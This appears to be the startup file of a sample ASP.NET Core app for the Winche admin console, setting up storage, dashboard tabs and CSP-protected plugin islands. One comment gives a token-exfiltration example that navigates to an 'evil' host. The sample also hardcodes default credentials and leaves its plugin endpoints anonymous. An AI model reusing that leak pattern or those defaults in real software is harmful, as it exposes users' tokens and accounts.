using Microsoft.AspNetCore.StaticFiles;
using Microsoft.Extensions.FileProviders;
using Winche.Console;
using Winche.Console.Sample;
using Winche.Console.Tabs;
using Winche.Database.DependencyInjection;
using Winche.Storage.DependencyInjection;
using Winche.Storage.S3.DependencyInjection;

var builder = WebApplication.CreateBuilder(args);

var connectionString = builder.Configuration["Winche:ConnectionString"]
    ?? throw new InvalidOperationException("Set Winche:ConnectionString (see appsettings.json).");

builder.Services.AddWincheDatabase(cfg => cfg.ConnectionString = connectionString);
builder.Services.AddWincheStorage(opts =>
{
    opts.ConnectionString = connectionString;
    opts.UseS3Archive(s3 =>
    {
        s3.BucketName = builder.Configuration["Storage:Bucket"] ?? "winche-sample";
        s3.ServiceUrl = builder.Configuration["Storage:ServiceUrl"] ?? "http://localhost:9000";
        s3.AccessKey = builder.Configuration["Storage:AccessKey"] ?? "minioadmin";
        s3.SecretKey = builder.Configuration["Storage:SecretKey"] ?? "minioadmin";
        s3.RegionName = "us-east-1";
        s3.ForcePathStyle = true;   // required for MinIO
    });
});

// The Flutter demo island is served from its build output when present (build it with
// `flutter build web --csp --base-href=/plugins/flutter/` in samples/flutter-demo). Its tab and route
// register only when the build exists, so `dotnet build`/run never depends on Flutter being installed.
var flutterWeb = Path.GetFullPath(Path.Combine(builder.Environment.ContentRootPath, "..", "flutter-demo", "build", "web"));
var hasFlutter = Directory.Exists(flutterWeb);

builder.Services.AddWincheConsole(o =>
{
    o.ConnectionString = connectionString;
    o.SeedAdminEmail = "admin@winche.local";
    o.SeedAdminPassword = "Admin123!";

    o.AddDatabaseTab(b => b.UseRulesEditor());   // Database tab + its Rules sub-tab
    o.AddStorageTab(b => b.UseRulesEditor());     // Storage tab + its Rules sub-tab

    // Custom tabs — declarative dashboards rendered by the console from its widget catalog.
    o.AddTab("analytics", "Analytics", tab =>
    {
        tab.Icon = "chart-bar";
        tab.MinRole = ConsoleRole.Member;
        tab.Layout(new Filter(new Select("range", ["7 days", "30 days", "90 days"]),
        [
            new StatRow<AnalyticsTabProvider>(d => d.Kpis),
            new Row([
                new Chart<AnalyticsTabProvider>(d => d.Signups, ChartKind.Line) { Flex = 2 },
                new Table<AnalyticsTabProvider>(d => d.Recent) { Flex = 1 },
            ]),
            new Section("Breakdown", "Switch the view to swap the panel below", [
                new Filter(new Select("view", ["Signups", "Revenue"]), v => v switch
                {
                    "Signups" => new Node[] { new Chart<AnalyticsTabProvider>(d => d.SignupsBar, ChartKind.Bar) },
                    _         => new Node[] { new StatRow<AnalyticsTabProvider>(d => d.Revenue) },
                }),
            ]),
        ]));
    });

    o.AddTab("traffic", "Traffic", tab =>
    {
        tab.Icon = "report-analytics";
        tab.MinRole = ConsoleRole.Viewer;
        tab.Layout(new Column([
            new StatRow<TrafficTabProvider>(d => d.Totals),
            new Chart<TrafficTabProvider>(d => d.Byday, ChartKind.Bar),
        ]));
    });

    o.AddTab("notes", "Notes", tab =>
    {
        tab.Icon = "table";
        tab.MinRole = ConsoleRole.Viewer;
        tab.Layout(new Column([
            new StatRow<NotesTabProvider>(d => d.Summary),
            new Embed("note-editor", "/plugins/notes") { MinHeight = 160 },
        ]));
    });

    o.AddTab("users", "Users", tab =>
    {
        tab.Icon = "table";
        tab.MinRole = ConsoleRole.Member;
        var create = tab.Command((UsersTab d) => d.CreateUser, c => { c.Label = "Create user"; c.MinRole = ConsoleRole.Admin; });
        var del = tab.Command((UsersTab d) => d.DeleteUser, c => { c.Label = "Delete"; c.MinRole = ConsoleRole.Admin; c.Confirm = "Delete this user?"; });
        // The manual TextInput renders its own "Search" button inline; the toolbar row just holds Create user.
        tab.Layout(new Filter(new TextInput("q") { Placeholder = "Search email…", Apply = Apply.Manual },
        [
            new Row([ new Button(create) ]) { Justify = RowJustify.Start },
            new Table<UsersTab>(d => d.Rows) { Paginate = 10, RowActions = [ new RowActionRef(del) ] },
        ]));
    });

    // A Flutter web app as an island — a sibling KPI (bumped by the island's refetch) next to the embed.
    if (hasFlutter)
    {
        o.AddTab("flutter", "Flutter", tab =>
        {
            tab.Icon = "layout-dashboard";
            tab.MinRole = ConsoleRole.Viewer;
            tab.Layout(new Column([
                new StatRow<FlutterTabProvider>(d => d.Status),
                new Embed("flutter-island", "/plugins/flutter/") { MinHeight = 340, Sandbox = EmbedSandbox.Popups },
            ]));
        });
    }
});

var app = builder.Build();

await app.InitializeWincheDatabaseAsync();
await app.InitializeWincheStorageAsync();
await SampleData.SeedAsync(app.Services);

app.MapGet("/", () => Results.Redirect("/_console"));

// Sample escape-hatch island, served same-origin so the console can frame it and cookies flow.
// NOTE: these endpoints are anonymous for brevity; a real plugin should require authorization.
app.MapGet("/plugins/notes", (HttpContext http) =>
{
    // The island holds a bearer token, so it must not be able to exfiltrate it. connect-src 'self' blocks
    // fetch/XHR/WebSocket exfil; default-src 'self' blocks image-beacon exfil; form-action 'self' blocks a
    // cross-origin form POST. (Self-navigation exfil — location = "https://evil/?t=" + token — can't be stopped
    // by CSP; the primary defense there is island code correctness.) 'unsafe-inline' on script-src/style-src is
    // only needed because this sample inlines its <script> and <style>; a real plugin ships bundled assets with a
    // nonce. (Without style-src, default-src 'self' blocks the inline <style> and the island renders collapsed.)
    http.Response.Headers["Content-Security-Policy"] =
        "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; connect-src 'self'; form-action 'self'";
    return Results.Content(NotesIsland.Html, "text/html");
});
app.MapPost("/plugins/api/notes", (NoteRequest req) => Results.Ok(new NoteCountResponse(NoteStore.Add(req.Text))));

// Flutter web island: serve its build output at /plugins/flutter with a Flutter-appropriate CSP. It's looser
// than the notes island — CanvasKit needs 'wasm-unsafe-eval', Flutter injects inline styles and uses data:/blob:
// images + workers. Built with --no-web-resources-cdn so CanvasKit is self-hosted, but CanvasKit still fetches
// its default Roboto font from Google Fonts at runtime, so fonts.gstatic.com is allowed. (A token-bearing island
// would bundle the font instead, keeping connect-src 'self' — see the design notes.) Each island tunes its own CSP.
if (hasFlutter)
{
    var flutterFiles = new PhysicalFileProvider(flutterWeb);
    var flutterTypes = new FileExtensionContentTypeProvider();
    flutterTypes.Mappings[".wasm"] = "application/wasm";
    flutterTypes.Mappings[".mjs"] = "text/javascript";
    const string flutterCsp =
        "default-src 'self'; script-src 'self' 'wasm-unsafe-eval'; style-src 'self' 'unsafe-inline'; " +
        "img-src 'self' data: blob:; font-src 'self' data: https://fonts.gstatic.com; " +
        "connect-src 'self' https://fonts.gstatic.com; worker-src 'self' blob:; frame-ancestors 'self'";

    app.MapGet("/plugins/flutter/{**path}", (HttpContext http, string? path) =>
    {
        var rel = string.IsNullOrEmpty(path) ? "index.html" : path;
        var file = flutterFiles.GetFileInfo(rel);
        if (!file.Exists) return Results.NotFound();
        http.Response.Headers["Content-Security-Policy"] = flutterCsp;
        var contentType = flutterTypes.TryGetContentType(rel, out var ct) ? ct : "application/octet-stream";
        return Results.File(file.CreateReadStream(), contentType);
    });
}

app.MapWincheConsole("/_console");

app.Run();
